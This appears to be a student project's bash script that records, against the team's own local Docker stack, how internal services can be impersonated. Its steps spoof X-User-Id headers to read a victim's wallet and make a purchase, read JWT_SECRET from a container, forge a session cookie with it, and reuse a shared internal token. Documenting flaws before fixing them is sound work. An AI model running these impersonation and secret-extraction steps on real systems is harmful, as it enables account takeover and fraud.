#!/usr/bin/env bash
# Captura la evidencia "antes" del escenario 4 (T3-05). Se corre desde la raiz
# del repo con el stack levantado:
#   bash documentation/prototipo3/escenario-4-auth-servicios/antes/capturar-antes.sh <salidas> <id victima>
# Cada prueba guarda en $SALIDA/NN-nombre.txt el comando exacto ($ ...) y lo que
# respondio. Ojo: la prueba 05 hace una compra real a nombre de la victima.
set -u
SALIDA="$1"          # carpeta destino (antes/salidas)
VICTIMA="$2"         # id de la victima (ver Preparacion en evidencia-antes.md)
CA=services/gateway/certs/ca.crt
mkdir -p "$SALIDA"

# cap NOMBRE COMANDO: ejecuta el comando con bash y guarda comando + salida.
cap() {
  local nombre="$1" cmd="$2"
  {
    printf '$ %s\n' "$cmd"
    bash -c "$cmd" 2>&1
    printf '\n'
  } > "$SALIDA/$nombre.txt"
  echo "== $nombre"; cat "$SALIDA/$nombre.txt"
}

# 00: quien comparte red con el Orquestador (puede llamarlo directo).
cap 00-redes-orquestador "for red in gw_backend orq_backend; do echo \"--- \$red ---\"; docker network inspect arquisoft-prototipo2_\$red --format '{{range .Containers}}{{.Name}}{{\"\\n\"}}{{end}}' | sed '/^\$/d' | sort; done"

# 01: control, por el Gateway publico la cabecera falsa no sirve (Nginx la borra).
cap 01-gateway-publico-borra-cabecera "curl -s -w '\\nHTTP %{http_code}\\n' --cacert $CA -H 'X-User-Id: $VICTIMA' -H 'X-User-Rol: player' https://localhost/api/billetera"

# 02: desde dentro del Gateway, sin cabeceras: el Orquestador responde 401.
cap 02-gateway-sin-cabecera "docker exec arqui_gateway curl -s -w '\\nHTTP %{http_code}\\n' http://orquestador:8081/billetera"

# 03: desde el Gateway, con X-User-Id escrito a mano: saldo de la victima.
cap 03-gateway-suplanta-billetera "docker exec arqui_gateway curl -s -w '\\nHTTP %{http_code}\\n' -H 'X-User-Id: $VICTIMA' -H 'X-User-Rol: player' http://orquestador:8081/billetera"

# 04: lo mismo con sus datos personales (pagina del usuario).
cap 04-gateway-suplanta-pagina "docker exec arqui_gateway curl -s -w '\\nHTTP %{http_code}\\n' -H 'X-User-Id: $VICTIMA' -H 'X-User-Rol: player' http://orquestador:8081/pagina-usuario"

# 05: escritura a nombre de la victima: una compra que ella no hizo.
cap 05-gateway-suplanta-compra "docker exec arqui_gateway curl -s -w '\\nHTTP %{http_code}\\n' -X POST -H 'Content-Type: application/json' -H 'Idempotency-Key: e4-ataque-1' -H 'X-User-Id: $VICTIMA' -H 'X-User-Rol: player' -d '{\"monto_cop\":5000}' http://orquestador:8081/billetera/compras"

# 06: desde Pagos (otro contenedor en orq_backend), sin wget ni curl: Python.
cap 06-pagos-suplanta-billetera "docker exec arqui_pagos python -c \"import urllib.request as u; r=u.urlopen(u.Request('http://orquestador:8081/billetera', headers={'X-User-Id':'$VICTIMA','X-User-Rol':'player'})); print(r.status, r.read().decode())\""

# 07: WebSocket directo al Motor sin identidad: rechazado.
cap 07-ws-motor-sin-cabecera "docker exec arqui_gateway curl -s -i --max-time 3 -H 'Connection: Upgrade' -H 'Upgrade: websocket' -H 'Sec-WebSocket-Version: 13' -H 'Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==' -H 'Origin: http://localhost' http://motor:8080/ws | head -5"

# 08: WebSocket directo al Motor con X-User-Id a mano: 101, conectado como la victima.
cap 08-ws-motor-suplanta "docker exec arqui_gateway curl -s -i --max-time 3 -H 'Connection: Upgrade' -H 'Upgrade: websocket' -H 'Sec-WebSocket-Version: 13' -H 'Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==' -H 'Origin: http://localhost' -H 'X-User-Id: $VICTIMA' http://motor:8080/ws | head -5"

# 09: el Motor guarda JWT_SECRET, el mismo con el que Usuarios firma las cookies
# (se muestra solo el hash para no publicar el secreto).
cap 09-jwt-secret-en-motor "for c in arqui_usuarios arqui_motor; do printf '%-16s ' \$c; docker exec \$c sh -c 'printf %s \"\$JWT_SECRET\" | sha256sum'; done"

# 10: con ese secreto se fabrica una cookie de la victima (HS256 con la
# biblioteca estandar de Python) y se entra por el Gateway PUBLICO.
cap 10-cookie-fabricada-con-secreto-del-motor "SECRETO=\$(docker exec arqui_motor printenv JWT_SECRET); COOKIE=\$(python3 -I -c \"import base64,hmac,hashlib,json,sys,time; b=lambda d: base64.urlsafe_b64encode(d).rstrip(b'=').decode(); h=b(json.dumps({'alg':'HS256','typ':'JWT'}).encode()); p=b(json.dumps({'sub':'$VICTIMA','rol':'player','iat':int(time.time()),'exp':int(time.time())+3600}).encode()); s=b(hmac.new(sys.argv[1].encode(), (h+'.'+p).encode(), hashlib.sha256).digest()); print(h+'.'+p+'.'+s)\" \"\$SECRETO\"); curl -s -w '\\nHTTP %{http_code}\\n' --cacert $CA -b \"session=\$COOKIE\" https://localhost/api/billetera"

# 11: el mismo INTERNAL_API_TOKEN en cinco contenedores (hash, no el valor).
cap 11-token-compartido "for c in arqui_orquestador arqui_usuarios arqui_pagos arqui_pagos_consumer arqui_motor; do printf '%-22s ' \$c; docker exec \$c sh -c 'printf %s \"\$INTERNAL_API_TOKEN\" | sha256sum'; done"

# 12: el Motor, con su copia del token, lee datos de Usuarios (no deberia llamarlo).
cap 12-motor-llama-usuarios "docker exec arqui_motor sh -c 'wget -qO- --header \"X-Internal-Service-Token: \$INTERNAL_API_TOKEN\" http://usuarios:8001/internal/users/$VICTIMA'; echo"

# 13: Pagos, con su copia, tambien lee de Usuarios (no deberia llamarlo).
cap 13-pagos-llama-usuarios "docker exec arqui_pagos python -c \"import os,urllib.request as u; r=u.urlopen(u.Request('http://usuarios:8001/internal/users/$VICTIMA', headers={'X-Internal-Service-Token':os.environ['INTERNAL_API_TOKEN']})); print(r.status, r.read().decode())\""

# 14: el consumidor de Pagos tiene el token pero no hace llamadas HTTP.
cap 14-consumer-no-usa-token "grep -c -E 'httpx|requests|urllib|X-Internal-Service-Token' services/pagos/app/consumer.py"
